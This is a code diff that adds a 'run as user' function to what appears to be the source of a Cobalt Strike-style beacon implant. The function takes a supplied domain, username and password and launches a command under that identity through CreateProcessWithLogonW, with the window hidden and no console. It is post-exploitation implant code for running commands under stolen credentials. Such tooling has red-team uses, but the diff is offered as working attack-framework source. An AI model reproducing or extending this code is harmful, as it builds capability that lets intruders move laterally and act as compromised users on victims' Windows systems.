@@ -1123,6 +1123,60 @@ BOOL SpawnProcess(RUN_UNDER_CONFIG* execution)
 	return TRUE;
 }
 
+BOOL RunAsUserInternal(LPCCH domain, LPCCH username, LPCCH password, LPCCH cmd, int creationFlags, LPPROCESS_INFORMATION lpProcessInfo)
+{
+	datap* parser = BeaconDataAlloc(0xA000);
+	WCHAR* lpCommandLine = BeaconDataPtr(parser, 0x4000);
+	WCHAR* lpDomain = BeaconDataPtr(parser, 0x400);
+	WCHAR* lpUsername = BeaconDataPtr(parser, 0x400);
+	WCHAR* lpPassword = BeaconDataPtr(parser, 0x400);
+	WCHAR* lpCurrentDirectory = BeaconDataPtr(parser, 0x400);
+
+	STARTUPINFOA si = { sizeof(si) };
+	*lpProcessInfo = { 0 };
+
+	GetStartupInfoA(&si);
+	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
+	si.wShowWindow = SW_HIDE;
+	si.hStdInput = 0;
+	si.hStdOutput = 0;
+	si.hStdError = 0;
+	si.lpDesktop = NULL;
+
+	toWideChar(cmd, lpCommandLine, 0x4000);
+	toWideChar(domain, lpDomain, 0x400);
+	toWideChar(username, lpUsername, 0x400);
+	toWideChar(password, lpPassword, 0x400);
+
+	if (GetCurrentDirectoryW(0, 0) < 0x400)
+	{
+		GetCurrentDirectoryW(0x400, lpCurrentDirectory);
+	}
+
+	BOOL result = TRUE;
+	if (!CreateProcessWithLogonW(
+		lpUsername,
+		lpDomain,
+		lpPassword,
+		LOGON_WITH_PROFILE,
+		NULL,
+		lpCommandLine,
+		creationFlags | CREATE_NO_WINDOW | CREATE_UNICODE_ENVIRONMENT,
+		NULL,
+		lpCurrentDirectory,
+		(LPSTARTUPINFOW)&si,
+		lpProcessInfo))
+	{
+		DWORD lastError = GetLastError();
+		LERROR("Could not run %s as %s\\%s: %s", cmd, domain, username, LAST_ERROR_STR(lastError));
+		BeaconErrorPrintf(ERROR_RUN_AS_USER_FAILED, "%s as %s\\%s: %d", cmd, domain, username, lastError);
+		result = FALSE;
+	}
+
+	BeaconDataFree(parser);
+	return result;
+}
+
 BOOL RunProcessWithAdjustedCmd(RUN_UNDER_CONFIG* execution)
 {
 	EXPANDED_CMD cmds;
